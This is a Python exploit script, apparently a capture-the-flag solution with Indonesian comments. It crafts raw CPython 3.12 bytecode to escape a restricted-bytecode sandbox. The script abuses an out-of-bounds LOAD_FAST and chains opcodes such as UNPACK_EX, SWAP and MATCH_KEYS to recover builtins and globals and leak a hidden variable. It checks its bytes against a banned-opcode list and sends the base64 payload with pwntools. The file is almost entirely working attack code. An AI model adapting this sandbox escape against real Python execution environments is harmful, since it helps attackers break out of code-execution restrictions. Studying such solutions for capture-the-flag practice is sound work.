from pwn import *
from dis import dis, _all_opmap as opmap
# https://docs.python.org/3.12/library/dis.html#python-bytecode-instructions
# Ini ada OOB di LOAD_FAST cuma dia beda tiap program?????
# Kalo di challenge file dia ada di index 42 ('*')
BUILTINS_INDEX = 42
LOAD_FAST = opmap['LOAD_FAST']
LOAD_GLOBAL = opmap['LOAD_GLOBAL']
RETURN_VALUE = opmap['RETURN_VALUE']
DELETE_SUBSCR = opmap['DELETE_SUBSCR']
STORE_FAST = opmap['STORE_FAST']
BUILD_MAP = opmap['BUILD_MAP']
LAE = opmap['LOAD_ASSERTION_ERROR']
FOR_ITER = opmap['FOR_ITER']
GET_ITER = opmap['GET_ITER']
LOAD_CONST = 100
CALL_NO_KW_STR_1 = opmap['CALL_NO_KW_STR_1']
SWAP = opmap['SWAP']
UNPACK_EX = opmap['UNPACK_EX']
MATCH_KEYS = opmap['MATCH_KEYS']
UNPACK_EX2 = b'^x'               # UNPACK_EX atau star (*x) basically *x trus unpacked valuesnya ada 120 ord('x')
SWAP_STACK = b'cy'              # Swap stack[-121] dengan TOS
POP = (opmap['POP_JUMP_IF_NONE'], 0 )               # POP
BUILD_TUPLE2 = b'fx'             # Make a 120 sized tuple
BUILD_TUPLE = opmap['BUILD_TUPLE']
DUMP_TO_STACK = b'!;^x'         # MATCH_KEYS -> UNPACK_EX (sekarang 120 values builtin ada di stack)
CALL_NO_KW_BUILTIN_FAST = opmap['CALL_NO_KW_BUILTIN_FAST']
CALL_NO_KW_LEN = opmap['CALL_NO_KW_LEN']
CALL_NO_KW_TUPLE_1 = opmap['CALL_NO_KW_TUPLE_1']
STORE_SUBSCR = opmap['STORE_SUBSCR']
LOAD_GLOBAL_BUILTIN = opmap['LOAD_GLOBAL_BUILTIN']
COPY = opmap['COPY']
context.log_level = 'error'

CNT = 43
CNT2 = 23

code = bytes([
    # Recover builtins,
    COPY, 5,                        
    COPY, 6,    
    UNPACK_EX, CNT,
    SWAP, CNT+1,
    *POP,
    BUILD_TUPLE, CNT,
    MATCH_KEYS, CNT,
    UNPACK_EX, 2,
    SWAP, 2,						# print function on TOS
    

    #	STACK:
    #	_____________
    #	|  print()	|
    #	|-----------|
    #	| builtins	|
    #	|-----------|
	#	|	<..>	|
    #	|-----------|


    # # Recover globals
    COPY, 11,
    COPY, 12,
    UNPACK_EX, CNT2,
    SWAP, CNT2+1,
    *POP,
    BUILD_TUPLE, CNT2,
    MATCH_KEYS, 2,
    UNPACK_EX, 2,
    # BUILD_TUPLE, 29,
    
	# #	STACK:
	# #	________________
	# #	|  '__main__'	|
	# #	|---------------|
	# #	|     code   	|
	# #	|---------------|
    
	# # Position code variable and print function on the stack
    SWAP, 2,
    COPY, 6,						# print functions
    COPY, 2,						# code variable
    
	# # #	STACK:
	# # #	_____________
	# # #	|	code	|
	# # #	|-----------|
	# # #	|  print()	|
	# # #	|-----------|
		
    CALL_NO_KW_LEN, 0,				# print(code)
    2,2,2,2,2,32-5+13-5-3,			# cache and also to make it divisible by 17
    RETURN_VALUE, 0,
])

from base64 import b64encode
print(len(code))    
divis = sum([x for x in code]) % 17
print(divis)

A = [108, 109, 68, 93, 62, 63, 64, 25, 60, 61, 144, 1, 171, 39, 47, 27, 60, 71, 74, 87, 90, 95, 97, 100, 101, 106, 116, 124, 125, 127, 136, 137, 138, 141, 143, 175, 176, 262, 263, 264, 265, 266, 66, 67, 70, 72, 73, 76, 77, 78, 79, 80, 81, 82, 84, 86, 88, 111, 112, 113, 148, 153, 154, 158, 159, 160]
assert (set(A) & set(code)) == set()

print(opmap['PUSH_NULL'] )
# assert divis == 0
# p = remote("localhost", 1225)
p = process(["python", "../public/chal.py"])

b64code = b64encode(code)
payload = open('payload', 'w')
payload.write(b64code.decode())
payload.close()

p.sendline(b64code)
p.interactive()
